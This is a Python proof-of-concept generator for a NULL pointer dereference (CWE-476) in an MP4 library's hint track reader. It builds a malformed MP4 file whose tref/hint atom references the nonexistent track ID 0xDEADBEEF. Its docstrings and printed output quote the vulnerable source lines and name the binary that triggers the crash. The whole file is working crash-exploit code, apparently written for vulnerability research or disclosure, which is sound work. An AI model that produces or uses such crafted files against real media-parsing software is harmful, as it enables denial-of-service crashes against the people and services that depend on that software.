#!/usr/bin/env python3
"""
PoC generator for VULN-002:
  NULL Pointer Dereference via Unvalidated GetTrack Return
  in AP4_HintTrackReader::AP4_HintTrackReader()

Vulnerability: Ap4HintTrackReader.cpp lines 66-70:
    AP4_UI32 media_track_id = AP4_DYNAMIC_CAST(AP4_TrefTypeAtom, atom)->GetTrackIds()[0];
    m_MediaTrack = movie.GetTrack(media_track_id);   // returns NULL if ID not in movie
    // get the media time scale
    m_MediaTimeScale = m_MediaTrack->GetMediaTimeScale();  // NULL dereference -> SIGSEGV

Trigger condition: MP4 hint track's tref/hint atom references a track ID (0xDEADBEEF)
that does not exist in the movie. movie.GetTrack(0xDEADBEEF) returns NULL, and then
line 70 dereferences that NULL pointer.

MP4 structure:
  ftyp
  moov
    mvhd  (next_track_id=3)
    trak  (track_id=1, handler='soun')   <- audio track
      tkhd
      mdia
        mdhd
        hdlr  (soun)
        minf
          smhd
          dinf > dref > url
          stbl > stsd + stts + stsz + stco
    trak  (track_id=2, handler='hint')   <- hint track
      tkhd
      tref
        hint (track_ids=[0xDEADBEEF])   <- THE TRIGGER: non-existent track ID
      mdia
        mdhd
        hdlr  (hint)
        minf
          hmhd
          dinf > dref > url
          stbl > stsd + stts + stsz + stco
  mdat
"""

import struct
import os

OUT_DIR  = os.path.dirname(os.path.abspath(__file__))
OUT_FILE = os.path.join(OUT_DIR, "vuln_002.mp4")

# ── Box helpers ──────────────────────────────────────────────────────────────

def box(fourcc: str, payload: bytes) -> bytes:
    """Standard box: 4-byte BE size + 4-byte fourcc + payload."""
    assert len(fourcc) == 4, "fourcc must be exactly 4 chars"
    size = 4 + 4 + len(payload)
    return struct.pack(">I", size) + fourcc.encode("latin-1") + payload


def full_box(fourcc: str, version: int, flags: int, payload: bytes) -> bytes:
    """FullBox: box with version (1 byte) + flags (3 bytes) prefix."""
    vf = struct.pack(">B", version) + struct.pack(">I", flags)[1:]  # 4 bytes total
    return box(fourcc, vf + payload)


# ── ftyp ─────────────────────────────────────────────────────────────────────

def build_ftyp() -> bytes:
    payload = (
        b"isom"                  # major_brand
        + struct.pack(">I", 0)   # minor_version
        + b"isom"                # compatible_brands[0]
        + b"mp41"                # compatible_brands[1]
    )
    return box("ftyp", payload)


# ── Shared leaf atoms ─────────────────────────────────────────────────────────

def build_mvhd(next_track_id: int = 3) -> bytes:
    identity = struct.pack(">9I",
        0x00010000, 0, 0,
        0, 0x00010000, 0,
        0, 0, 0x40000000,
    )
    payload = (
        struct.pack(">I", 0)              # creation_time
        + struct.pack(">I", 0)            # modification_time
        + struct.pack(">I", 1000)         # timescale
        + struct.pack(">I", 0)            # duration
        + struct.pack(">I", 0x00010000)   # rate = 1.0
        + struct.pack(">H", 0x0100)       # volume = 1.0
        + b"\x00" * 10                    # reserved
        + identity                        # matrix (36 bytes)
        + b"\x00" * 24                    # pre_defined
        + struct.pack(">I", next_track_id) # next_track_ID
    )
    return full_box("mvhd", 0, 0, payload)


def build_tkhd(track_id: int, flags: int = 3) -> bytes:
    """Track header box (version=0, flags=3 means enabled+in-movie)."""
    identity = struct.pack(">9I",
        0x00010000, 0, 0,
        0, 0x00010000, 0,
        0, 0, 0x40000000,
    )
    payload = (
        struct.pack(">I", 0)        # creation_time
        + struct.pack(">I", 0)      # modification_time
        + struct.pack(">I", track_id)
        + struct.pack(">I", 0)      # reserved
        + struct.pack(">I", 0)      # duration
        + b"\x00" * 8              # reserved
        + struct.pack(">H", 0)     # layer
        + struct.pack(">H", 0)     # alternate_group
        + struct.pack(">H", 0x0100) # volume
        + struct.pack(">H", 0)     # reserved
        + identity
        + struct.pack(">II", 0, 0)  # width, height
    )
    return full_box("tkhd", 0, flags, payload)


def build_mdhd(timescale: int = 44100) -> bytes:
    payload = (
        struct.pack(">I", 0)          # creation_time
        + struct.pack(">I", 0)        # modification_time
        + struct.pack(">I", timescale)
        + struct.pack(">I", 0)        # duration
        + struct.pack(">H", 0x55C4)   # language = 'und'
        + struct.pack(">H", 0)        # pre_defined
    )
    return full_box("mdhd", 0, 0, payload)


def build_hdlr(handler_type: str, name: str = "") -> bytes:
    assert len(handler_type) == 4
    payload = (
        struct.pack(">I", 0)              # pre_defined
        + handler_type.encode("latin-1")  # handler_type (4 bytes)
        + b"\x00" * 12                    # reserved
        + name.encode("latin-1") + b"\x00"  # null-terminated name
    )
    return full_box("hdlr", 0, 0, payload)


def build_url_entry() -> bytes:
    """Self-contained data reference entry (flags=1 = self-contained)."""
    return full_box("url ", 0, 1, b"")


def build_dref() -> bytes:
    entry_count = struct.pack(">I", 1)
    return full_box("dref", 0, 0, entry_count + build_url_entry())


def build_dinf() -> bytes:
    return box("dinf", build_dref())


def build_stsd_empty() -> bytes:
    """stsd with zero sample entries — minimal valid structure."""
    return full_box("stsd", 0, 0, struct.pack(">I", 0))


def build_stts_empty() -> bytes:
    return full_box("stts", 0, 0, struct.pack(">I", 0))


def build_stsz_empty() -> bytes:
    return full_box("stsz", 0, 0, struct.pack(">II", 0, 0))


def build_stco_empty() -> bytes:
    return full_box("stco", 0, 0, struct.pack(">I", 0))


def build_stbl() -> bytes:
    payload = (
        build_stsd_empty()
        + build_stts_empty()
        + build_stsz_empty()
        + build_stco_empty()
    )
    return box("stbl", payload)


# ── Audio track helpers ───────────────────────────────────────────────────────

def build_smhd() -> bytes:
    return full_box("smhd", 0, 0, struct.pack(">HH", 0, 0))


def build_audio_minf() -> bytes:
    payload = build_smhd() + build_dinf() + build_stbl()
    return box("minf", payload)


def build_audio_mdia() -> bytes:
    payload = (
        build_mdhd(44100)
        + build_hdlr("soun", "SoundHandler")
        + build_audio_minf()
    )
    return box("mdia", payload)


def build_audio_trak() -> bytes:
    payload = build_tkhd(1) + build_audio_mdia()
    return box("trak", payload)


# ── Hint track helpers ────────────────────────────────────────────────────────

def build_tref_hint(bad_track_id: int = 0xDEADBEEF) -> bytes:
    """
    tref box containing a 'hint' child atom that references bad_track_id.

    AP4_TrefTypeAtom parses the payload as a list of 4-byte track IDs.
    AP4_HintTrackReader::AP4_HintTrackReader() does:
        AP4_UI32 media_track_id = GetTrackIds()[0];   // = bad_track_id
        m_MediaTrack = movie.GetTrack(media_track_id);// returns NULL
        m_MediaTimeScale = m_MediaTrack->GetMediaTimeScale(); // NULL deref
    """
    hint_payload = struct.pack(">I", bad_track_id)  # one track_id = 0xDEADBEEF
    hint_atom = box("hint", hint_payload)
    return box("tref", hint_atom)


def build_hmhd() -> bytes:
    """Hint Media Header box."""
    payload = (
        struct.pack(">H", 0)   # maxPDUsize
        + struct.pack(">H", 0) # avgPDUsize
        + struct.pack(">I", 0) # maxbitrate
        + struct.pack(">I", 0) # avgbitrate
        + struct.pack(">I", 0) # reserved
    )
    return full_box("hmhd", 0, 0, payload)


def build_hint_minf() -> bytes:
    payload = build_hmhd() + build_dinf() + build_stbl()
    return box("minf", payload)


def build_hint_mdia() -> bytes:
    payload = (
        build_mdhd(90000)
        + build_hdlr("hint", "HintHandler")
        + build_hint_minf()
    )
    return box("mdia", payload)


def build_hint_trak() -> bytes:
    """
    Hint track (track_id=2) with tref/hint referencing 0xDEADBEEF.
    This is the malicious structure that triggers the NULL deref in
    AP4_HintTrackReader::AP4_HintTrackReader().
    """
    payload = (
        build_tkhd(2)
        + build_tref_hint(0xDEADBEEF)  # <-- trigger
        + build_hint_mdia()
    )
    return box("trak", payload)


# ── Top-level assembly ────────────────────────────────────────────────────────

def build_moov() -> bytes:
    payload = (
        build_mvhd(next_track_id=3)
        + build_audio_trak()   # track_id=1, handler='soun'
        + build_hint_trak()    # track_id=2, handler='hint', tref/hint -> 0xDEADBEEF
    )
    return box("moov", payload)


def build_mdat() -> bytes:
    return box("mdat", b"")


def main():
    mp4_data = build_ftyp() + build_moov() + build_mdat()

    with open(OUT_FILE, "wb") as f:
        f.write(mp4_data)

    print(f"[+] Written {len(mp4_data)} bytes to {OUT_FILE}")
    print()
    print("[+] Vulnerability: CWE-476 NULL Pointer Dereference")
    print("[+] Location: AP4_HintTrackReader::AP4_HintTrackReader() line 70")
    print("[+] File: Ap4HintTrackReader.cpp")
    print()
    print("[+] Trigger structure:")
    print("      moov/trak[2]/tref/hint -> track_id = 0xDEADBEEF")
    print("      movie.GetTrack(0xDEADBEEF) returns NULL")
    print("      m_MediaTrack->GetMediaTimeScale()  <- NULL deref -> SIGSEGV")
    print()
    print("[!] Note: The crash requires AP4_HintTrackReader::Create() to be called.")
    print("    mp42aac does NOT call this function; it only processes audio tracks.")
    print("    The canonical trigger binary is mp4rtphintinfo (requires compilation).")


if __name__ == "__main__":
    main()
